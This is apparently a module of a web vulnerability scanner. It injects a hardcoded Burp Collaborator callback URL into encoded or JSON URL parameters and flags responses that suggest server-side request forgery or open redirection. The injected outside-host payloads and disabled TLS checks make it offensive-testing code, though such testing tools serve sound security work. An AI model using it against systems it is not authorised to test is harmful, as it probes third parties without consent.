import requests
import re
from core import nano
from core import regex
from core import decoder_encoder
from core import jsonInjector
from core import detactor
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ssrf_regix='k6unx4pudf8k5itoapaxjwzjigz'
ssrf_link='http://omeg0ivn7k95wloyezah7zcqghm7aw.burpcollaborator.net'

def ssrf_(url):
    x=detactor.detactor_(url)
    y=decoder_encoder.decoder_(x)
    
    if(y):
        if nano.isJson(y)== True:
            
                z=jsonInjector.main_(y,ssrf_link)
                payload=decoder_encoder.encoder_(z)
                link=url.replace(x,payload)

                try:
                    r = requests.get(link,verify=False,timeout=13)
                    resp= r.content
                    x1 = re.search(ssrf_regix, str(resp))
                    if (x1):
                        print('\033[91mPossibly SSRF vulnerability\033[00m  '+link)
                except:
                    pass
        else:
                payload=decoder_encoder.encoder_(ssrf_link)
                link=url.replace(x,payload)

                try:
                    r = requests.get(link,verify=False,timeout=13)
                    resp= r.content
                    x1 = re.search(ssrf_regix, str(resp))
                    if (x1):
                        
                         if r.history :
                              print('\033[91m Possibly open redirection vulnerability\033[00m '+link)      
                         else:
                              print('\033[91m Possibly SSRF vulnerability\033[00m '+link)
                except:
                    pass
                    
   
    else:
       
            payload=decoder_encoder.encoder_(ssrf_link)
            link=url.replace(x,payload)

            try:
                r = requests.get(link,verify=False,timeout=13)
                resp= r.content
                x1 = re.search(ssrf_regix, str(resp))
                if (x1):
                    print('\033[91mPossibly SSRF vulnerability\033[00m  '+link)
            except:
                pass
